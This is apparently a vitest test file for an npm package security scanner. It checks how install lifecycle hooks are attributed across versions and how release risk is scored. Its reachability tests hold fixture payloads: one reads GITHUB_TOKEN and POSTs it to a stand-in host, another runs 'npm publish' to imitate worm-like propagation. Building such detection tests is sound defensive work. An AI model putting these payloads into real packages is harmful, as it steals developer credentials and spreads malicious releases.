import { createHash } from "node:crypto";
import { describe, expect, test } from "vitest";
import type { AiReview } from "../server/lib/ai-review/types";
import { parsePackageJson } from "../server/lib/tar-parser.js";
import {
  annotateFindingsWithDiffStatus,
  createPackageDiff,
  DETERMINISTIC_RULES_VERSION,
  deterministicFindings,
  packageJsonDiffFindings,
  redactFileRecords,
  redactFindings,
  summarizePackageJsonDiff,
  type FileRecord,
} from "../server/lib/review";
import { computeScanRiskBreakdown } from "../server/lib/review/risk";
import type { FindingAnnotationOptions } from "../server/lib/review/types";

const AI_OFF: AiReview = {
  status: "unavailable",
  risk: "low",
  releaseAssessment: "not_assessed",
  summary: "",
  findings: [],
  requiresManualReview: false,
  model: null,
  reviewerVersion: null,
};
const SETUP = "console.log('setup complete');\n";
const FILES = { "setup.js": SETUP, "next.js": SETUP };

function file(path: string, textSample?: string): FileRecord {
  return {
    path,
    size: Buffer.byteLength(textSample ?? ""),
    sha256: createHash("sha256")
      .update(textSample ?? "")
      .digest("hex"),
    flags: [],
    ...(textSample === undefined ? {} : { textSample }),
  };
}

function manifest(
  version: string,
  scripts: Record<string, string | undefined>,
  pretty = false,
): string {
  return JSON.stringify({ name: "lifecycle-fixture", version, scripts }, null, pretty ? 2 : 0);
}

function review(
  previousManifest: string | null | undefined,
  stagedManifest: string,
  previousCode: Record<string, string> = FILES,
  stagedCode: Record<string, string> = previousCode,
  options: FindingAnnotationOptions = {},
) {
  const previousFiles = [
    ...(previousManifest === undefined
      ? []
      : [file("package.json", previousManifest ?? undefined)]),
    ...Object.entries(previousCode).map(([path, text]) => file(path, text)),
  ];
  const stagedFiles = [
    file("package.json", stagedManifest),
    ...Object.entries(stagedCode).map(([path, text]) => file(path, text)),
  ];
  const diff = createPackageDiff(previousFiles, stagedFiles);
  const previousPackageJson = parsePackageJson(previousFiles);
  const stagedPackageJson = parsePackageJson(stagedFiles);
  const previousSummary = previousPackageJson ? { ...previousPackageJson, bin: undefined } : null;
  const stagedSummary = stagedPackageJson ? { ...stagedPackageJson, bin: undefined } : null;
  const findings = [
    ...deterministicFindings(stagedFiles, diff, stagedSummary, { previousFiles }),
    ...packageJsonDiffFindings(summarizePackageJsonDiff(previousSummary, stagedSummary)),
  ].map((finding, index) => ({ ...finding, id: `finding-${index}` }));
  const annotationOptions = { previousFiles, stagedFiles, ...options };
  const annotated = annotateFindingsWithDiffStatus(findings, diff, annotationOptions);
  return {
    findings,
    annotated,
    diff,
    previousFiles,
    stagedFiles,
    annotationOptions,
    risk: computeScanRiskBreakdown(annotated, AI_OFF),
  };
}

function hookFindings(result: ReturnType<typeof review>) {
  return result.annotated.filter((finding) =>
    ["install-script.lifecycle", "install-script.preinstall"].includes(finding.ruleId ?? ""),
  );
}

describe("semantic consumer lifecycle attribution", () => {
  test.each(["install", "postinstall", "preinstall"])(
    "version-only compact, pretty, and reformatted manifests keep %s contextual",
    (hook) => {
      const scripts = { [hook]: "node setup.js" };
      for (const [before, after] of [
        [manifest("1.0.0", scripts), manifest("1.0.1", scripts)],
        [manifest("1.0.0", scripts, true), manifest("1.0.1", scripts, true)],
        [manifest("1.0.0", scripts), manifest("1.0.1", scripts, true)],
      ]) {
        const result = review(before, after);
        expect(hookFindings(result)).toEqual([
          expect.objectContaining({
            ruleId:
              hook === "preinstall" ? "install-script.preinstall" : "install-script.lifecycle",
            severity: hook === "preinstall" ? "critical" : "high",
            ruleVersion: DETERMINISTIC_RULES_VERSION,
            evidence: `${hook}: node setup.js`,
            releaseDelta: false,
          }),
        ]);
        expect(result.risk.artifactRisk).toBe(hook === "preinstall" ? "critical" : "high");
        expect(result.risk.releaseRisk).toBe("low");
      }
    },
  );

  test.each([
    {
      before: { install: "node setup.js" },
      after: { install: "node setup.js", postinstall: "node next.js" },
      changed: "postinstall",
    },
    {
      before: { install: "node setup.js", postinstall: "node setup.js" },
      after: { install: "node setup.js", postinstall: "node next.js" },
      changed: "postinstall",
    },
    {
      before: { install: "node setup.js", preinstall: "node setup.js" },
      after: { install: "node setup.js", preinstall: "node next.js" },
      changed: "preinstall",
    },
  ])("attributes only the added or changed $changed hook", ({ before, after, changed }) => {
    const result = review(manifest("1.0.0", before), manifest("1.0.1", after));
    expect(
      hookFindings(result)
        .map((finding) => ({
          evidence: finding.evidence,
          releaseDelta: finding.releaseDelta,
        }))
        .sort((a, b) => a.evidence.localeCompare(b.evidence)),
    ).toEqual(
      Object.entries(after)
        .map(([hook, command]) => ({
          evidence: `${hook}: ${command}`,
          releaseDelta: hook === changed,
        }))
        .sort((a, b) => a.evidence.localeCompare(b.evidence)),
    );
    expect(result.risk.releaseRisk).toBe(changed === "preinstall" ? "critical" : "high");
  });

  test("JSON escaping changes representation without changing the effective hook", () => {
    const staged = String.raw`{"name":"lifecycle-fixture","version":"1.0.1","scripts":{"post\u0069nstall":"node \u0073etup.js"}}`;
    const result = review(manifest("1.0.0", { postinstall: "node setup.js" }), staged);
    expect(hookFindings(result)[0]).toMatchObject({
      evidence: "postinstall: node setup.js",
      releaseDelta: false,
    });
    expect(result.risk.releaseRisk).toBe("low");
  });

  test("the final duplicate hook key changes the effective command despite an unchanged first match", () => {
    const before = '{\n"scripts":{"postinstall":"node setup.js","postinstall":"node setup.js"}\n}';
    const staged = '{\n"scripts":{"postinstall":"node setup.js",\n"postinstall":"node next.js"}\n}';
    const result = review(before, staged);
    expect(hookFindings(result)[0]).toMatchObject({
      evidence: "postinstall: node next.js",
      line: 2,
      releaseDelta: true,
    });
    expect(result.risk.releaseRisk).toBe("high");
  });

  test("the final duplicate scripts object establishes the unchanged effective hook", () => {
    const before =
      '{"scripts":{"install":"node next.js"},"scripts":{"postinstall":"node setup.js"},"version":"1.0.0"}';
    const staged =
      '{"scripts":{"install":"node setup.js"},"scripts":{"postinstall":"node setup.js"},"version":"1.0.1"}';
    const result = review(before, staged);
    expect(hookFindings(result)).toEqual([
      expect.objectContaining({ evidence: "postinstall: node setup.js", releaseDelta: false }),
    ]);
    expect(result.risk.releaseRisk).toBe("low");
  });

  test.each([
    [
      "malformed with the unchanged hook display line",
      '{\n"scripts":{"postinstall":"node setup.js"}\n',
    ],
    ["missing", undefined],
    ["unreadable", null],
    ["non-object root", "[]"],
    ["invalid scripts shape", '{"scripts":[{"postinstall":"node setup.js"}]}'],
    ["non-string hook", '{"scripts":{"postinstall":7}}'],
  ])("cannot establish an unchanged hook from a %s baseline", (_label, baseline) => {
    const staged = '{\n"scripts":{"postinstall":"node setup.js"}\n}';
    const result = review(baseline, staged);
    expect(hookFindings(result)[0]).toMatchObject({ severity: "high", releaseDelta: true });
    expect(result.risk.releaseRisk).toBe("high");
  });

  test("persisted annotations take precedence over semantic reclassification and skipped comparison", () => {
    const result = review(
      manifest("1.0.0", { postinstall: "node setup.js" }),
      manifest("1.0.1", { postinstall: "node setup.js" }),
    );
    const finding = hookFindings(result)[0];
    const persisted = { diffStatus: "modified" as const, releaseDelta: true };
    const annotated = annotateFindingsWithDiffStatus(result.findings, result.diff, {
      ...result.annotationOptions,
      baselineComparisonSkipped: true,
      persistedAnnotations: new Map([[finding.id, persisted]]),
    });
    expect(annotated.find((entry) => entry.id === finding.id)).toMatchObject(persisted);
  });

  test("redacted commands do not establish equality between different raw token-bearing hooks", () => {
    const beforeToken = "npm_" + "FakeBefore".repeat(4);
    const stagedToken = "npm_" + "FakeAfter".repeat(4);
    const result = review(
      manifest("1.0.0", { postinstall: `node setup.js --marker=${beforeToken}` }),
      manifest("1.0.1", { postinstall: `node setup.js --marker=${stagedToken}` }),
    );
    const previousFiles = redactFileRecords(result.previousFiles);
    const stagedFiles = redactFileRecords(result.stagedFiles);
    const beforeCommand = parsePackageJson(previousFiles)?.scripts?.postinstall;
    const stagedCommand = parsePackageJson(stagedFiles)?.scripts?.postinstall;
    expect(beforeCommand).toBe(stagedCommand);
    expect(stagedCommand).toContain("[REDACTED_NPM_TOKEN]");
    const annotated = annotateFindingsWithDiffStatus(redactFindings(result.findings), result.diff, {
      previousFiles,
      stagedFiles,
    });
    expect(annotated).toContainEqual(
      expect.objectContaining({ ruleId: "install-script.lifecycle", releaseDelta: true }),
    );
    expect(computeScanRiskBreakdown(annotated, AI_OFF).releaseRisk).toBe("high");
  });

  test.each([undefined, "postinstall: unidentifiable command"])(
    "cannot discount a lifecycle finding with unmatched or missing evidence",
    (evidence) => {
      const result = review(
        manifest("1.0.0", { postinstall: "node setup.js" }),
        manifest("1.0.1", { postinstall: "node setup.js" }),
      );
      const findings = result.findings.map((finding) =>
        finding.ruleId === "install-script.lifecycle" ? { ...finding, evidence } : finding,
      );
      const annotated = annotateFindingsWithDiffStatus(
        findings,
        result.diff,
        result.annotationOptions,
      );
      expect(annotated).toContainEqual(
        expect.objectContaining({ ruleId: "install-script.lifecycle", releaseDelta: true }),
      );
    },
  );

  test("skipped baseline comparison stays unknown even when an install hook is present", () => {
    const result = review(
      undefined,
      manifest("1.0.1", { postinstall: "node setup.js" }),
      FILES,
      FILES,
      { baselineComparisonSkipped: true },
    );
    expect(hookFindings(result)[0]).toMatchObject({ diffStatus: "unknown", releaseDelta: false });
    expect(result.risk.artifactRisk).toBe("high");
    expect(result.risk.releaseRisk).toBe("low");
  });
});

describe("changed install reachability", () => {
  const payload =
    "const token = process.env.GITHUB_TOKEN;\nfetch('https://example.invalid/collect', { method: 'POST', body: token });\n";
  const importsPayload = "require('./test/payload.js');\n";
  const scripts = { postinstall: "node setup.js" };

  test("an unchanged hook newly importing an unchanged payload retains high release risk", () => {
    const before = { "setup.js": SETUP, "test/payload.js": payload };
    const staged = { ...before, "setup.js": `${SETUP}${importsPayload}` };
    const result = review(manifest("1.0.0", scripts), manifest("1.0.1", scripts), before, staged);
    for (const ruleId of ["code.credential-access", "code.network-access"]) {
      expect(result.annotated).toContainEqual(
        expect.objectContaining({
          ruleId,
          file: "test/payload.js",
          diffStatus: "unchanged",
          releaseDelta: true,
        }),
      );
    }
    expect(result.risk.releaseRisk).toBe("high");
  });

  test("an already install-reachable unchanged payload remains package context", () => {
    const before = { "setup.js": importsPayload, "test/payload.js": payload };
    const staged = { ...before, "setup.js": `${importsPayload}${SETUP}` };
    const result = review(manifest("1.0.0", scripts), manifest("1.0.1", scripts), before, staged);
    const payloadFindings = result.annotated.filter(
      (finding) => finding.file === "test/payload.js",
    );
    expect(payloadFindings.length).toBeGreaterThan(0);
    expect(payloadFindings.every((finding) => !finding.releaseDelta)).toBe(true);
    expect(result.risk.artifactRisk).toBe("high");
    expect(result.risk.releaseRisk).toBe("low");
  });

  test("new install reachability attributes an unchanged registry-publication payload", () => {
    const publish =
      "const { execFileSync } = require('child_process');\nexecFileSync('npm', ['publish']);\n";
    const before = { "setup.js": SETUP, "test/payload.js": publish };
    const staged = { ...before, "setup.js": importsPayload };
    const result = review(manifest("1.0.0", scripts), manifest("1.0.1", scripts), before, staged);
    expect(result.annotated).toContainEqual(
      expect.objectContaining({
        ruleId: "propagation.registry-publish",
        file: "test/payload.js",
        severity: "critical",
        diffStatus: "unchanged",
        releaseDelta: true,
      }),
    );
    expect(result.risk.releaseRisk).toBe("critical");
  });

  test.each([
    ["ordinary setup log", "console.log('setup complete: revised');\n"],
    [
      "node version check",
      "const { execFileSync } = require('child_process');\nexecFileSync('node', ['--version']);\n",
    ],
  ])(
    "keeps a benign %s change low without dropping the artifact lifecycle finding",
    (_label, setup) => {
      const result = review(
        manifest("1.0.0", scripts),
        manifest("1.0.1", scripts),
        { "setup.js": SETUP },
        { "setup.js": setup },
      );
      expect(hookFindings(result)[0]).toMatchObject({ severity: "high", releaseDelta: false });
      expect(result.risk.artifactRisk).toBe("high");
      expect(result.risk.releaseRisk).toBe("low");
    },
  );
});
